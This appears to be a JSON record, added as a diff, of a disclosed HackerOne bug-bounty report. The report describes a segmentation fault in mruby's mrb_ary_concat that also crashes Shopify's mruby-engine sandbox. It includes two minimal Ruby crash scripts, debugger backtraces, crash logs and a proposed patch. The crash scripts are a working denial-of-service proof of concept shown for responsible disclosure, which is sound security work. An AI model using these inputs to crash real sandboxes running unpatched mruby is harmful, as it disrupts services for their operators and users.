@@ -1,0 +1,120 @@
+{
+  "id": 184712,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQ3MTI=",
+  "url": "https://hackerone.com/reports/184712",
+  "title": "Denial of service due to invalid memory access in mrb_ary_concat",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-24T04:35:19.514Z",
+  "submitted_at": "2016-11-24T04:35:19.514Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haquaman",
+    "url": "/haquaman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-17T20:07:10.168Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-17T20:07:10.125Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T20:24:00.236Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nThe following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, then renamed variables and tidied so you can see what is needed and what isn't.\n\n```\ncase \"\"\n  when 0\nend\nx *case\n  when true\n    * = 0\nend\n```\n\nAlso this file causes the same issue:\n\n```\ncase \"\"\n  when 0\nend\nx = *case\n  when 0\n    * = 0\nend\n```\n\nDifference between the two is one is a method call, and one is assignment.\n\n```\n$ ./dev/bin/mruby --version\nmruby 1.2.0 (2015-11-17)\n```\n\n```\n$ ./dev/bin/mruby crash-1.rb\ncrash-1.rb:4:3: '*' interpreted as argument prefix\nSegmentation fault: 11\n```\n\n```\n$ lldb ./dev/bin/mruby crash-1.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash-1.rb\"\n(lldb) r\nProcess 54552 launched: './dev/bin/mruby' (x86_64)\ncrash-1.rb:4:3: '*' interpreted as argument prefix\nProcess 54552 stopped\n* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n    frame #0: 0x0000000100001837 mruby`ary_modify + 55\nmruby`ary_modify:\n->  0x100001837 <+55>: cmpl   $0x1, (%rax)\n    0x10000183a <+58>: jne    0x100001889               ; <+137>\n    0x100001840 <+64>: movq   -0x10(%rbp), %rax\n    0x100001844 <+68>: movq   0x28(%rax), %rax\n(lldb) bt\n* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n  * frame #0: 0x0000000100001837 mruby`ary_modify + 55\n    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49\n    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70\n    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439\n    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100\n    frame #6: 0x000000010006f19f mruby`load_exec + 1183\n    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n    frame #8: 0x0000000100000d78 mruby`main + 904\n    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x0000004800000019\n       rbx = 0x0000000000000000\n       rcx = 0x0000000000200086\n       rdx = 0x0000000100000000  mruby`_mh_execute_header\n       rdi = 0x00000001002029f0\n       rsi = 0x0000000100000000  mruby`_mh_execute_header\n       rbp = 0x00007fff5fbfc9d0\n       rsp = 0x00007fff5fbfc9a0\n        r8 = 0x0000000000000001\n        r9 = 0x0000000000000000\n       r10 = 0x0000000000000001\n       r11 = 0x0000000100200000\n       r12 = 0x0000000000000000\n       r13 = 0x0000000000000000\n       r14 = 0x0000000000000000\n       r15 = 0x0000000000000000\n       rip = 0x0000000100001837  mruby`ary_modify + 55\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nand the second file:\n\n```\n$ ./dev/bin/mruby crash-2.rb\nSegmentation fault: 11\n```\n\n```\n$ lldb ./dev/bin/mruby crash-2.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash-2.rb\"\n(lldb) r\nProcess 66755 launched: './dev/bin/mruby' (x86_64)\nProcess 66755 stopped\n* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n    frame #0: 0x0000000100001837 mruby`ary_modify + 55\nmruby`ary_modify:\n->  0x100001837 <+55>: cmpl   $0x1, (%rax)\n    0x10000183a <+58>: jne    0x100001889               ; <+137>\n    0x100001840 <+64>: movq   -0x10(%rbp), %rax\n    0x100001844 <+68>: movq   0x28(%rax), %rax\n(lldb) bt\n* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)\n  * frame #0: 0x0000000100001837 mruby`ary_modify + 55\n    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49\n    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70\n    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439\n    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135\n    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100\n    frame #6: 0x000000010006f19f mruby`load_exec + 1183\n    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67\n    frame #8: 0x0000000100000d78 mruby`main + 904\n    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x0000004800000019\n       rbx = 0x0000000000000000\n       rcx = 0x0000000000200086\n       rdx = 0x0000000100000000  mruby`_mh_execute_header\n       rdi = 0x00000001002029f0\n       rsi = 0x0000000100000000  mruby`_mh_execute_header\n       rbp = 0x00007fff5fbfc9d0\n       rsp = 0x00007fff5fbfc9a0\n        r8 = 0x0000000000000001\n        r9 = 0x0000000000000000\n       r10 = 0x0000000000000001\n       r11 = 0x0000000100700000\n       r12 = 0x0000000000000000\n       r13 = 0x0000000000000000\n       r14 = 0x0000000000000000\n       r15 = 0x0000000000000000\n       rip = 0x0000000100001837  mruby`ary_modify + 55\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nI took a look at the cause in the codegeneration, ... and gave up. But in the `src/array.c` I could fix these two issues with one patch, as follows:\n\n```\ndiff --git a/src/array.c b/src/array.c\nindex 5a319d8..4814968 100644\n--- a/src/array.c\n+++ b/src/array.c\n@@ -259,6 +259,15 @@ ary_concat(mrb_state *mrb, struct RArray *a, mrb_value *ptr, mrb_int blen)\n MRB_API void\n mrb_ary_concat(mrb_state *mrb, mrb_value self, mrb_value other)\n {\n+  if (!mrb_array_p(self)) {\n+    mrb_raisef(mrb, E_TYPE_ERROR, \"expecting Array, got %S\", mrb_obj_value(mrb_obj_class(mrb, self)));\n+    return;\n+  }\n+  if (!mrb_array_p(other)) {\n+    mrb_raisef(mrb, E_TYPE_ERROR, \"expecting Array, got %S\", mrb_obj_value(mrb_obj_class(mrb, other)));\n+    return;\n+  }\n+\n   struct RArray *a2 = mrb_ary_ptr(other);\n \n   ary_concat(mrb, mrb_ary_ptr(self), a2->ptr, a2->len);\n```\n\nAs mentioned above, both these files affect mruby-engine as well:\n\n```\n./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000019\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon't forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:0006b8 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:002310 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `<main>'\n./bin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n rax: 0x000000011061c3f0 rbx: 0x0000000110674668 rcx: 0x0000000000000004\n rdx: 0x000000011061c3f0 rdi: 0x0000000110614440 rsi: 0x0000000000000001\n rbp: 0x00007fff50037f40 rsp: 0x00007fff50037f10  r8: 0x0000000000000003\n  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x00000001106145a8\n r12: 0x00000001106145a8 r13: 0x000000011063b2f0 r14: 0x0000000000000001\n r15: 0x0000000000000001 rip: 0x00000001104f233d rfl: 0x0000000000010246\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x000000010fd645d4 rb_vm_bugreport + 388\n1   ruby                                0x000000010fc06023 rb_bug_context + 483\n2   ruby                                0x000000010fcd9653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   mruby_engine.bundle                 0x00000001104f233d mrb_ary_concat + 29\n5   ???                                 0x0000000110614440 0x0 + 4569777216\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n<snip various gems>\n  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\n```\n\nThe second file produced same backtrace, but different register values.\n\nAfter applying that patch to `ext/mruby_engine/mruby` and recompiling, these two files no longer crash.\n\nIf you end up finding a better patch elsewhere for the root cause, can you let me know what you end up applying so I can change what I fuzz against?\n\nCheers,\n\nHugh",
+  "bounty_amount": "8000.0",
+  "formatted_bounty": "$8,000",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-15T20:24:00.266Z",
+  "allow_singular_disclosure_after": -293828575.4578024,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "madrobot",
+    "eveeez",
+    "c12316651",
+    "linkks",
+    "japz",
+    "spetr0x",
+    "callibrator",
+    "hackerjuan",
+    "xcom"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
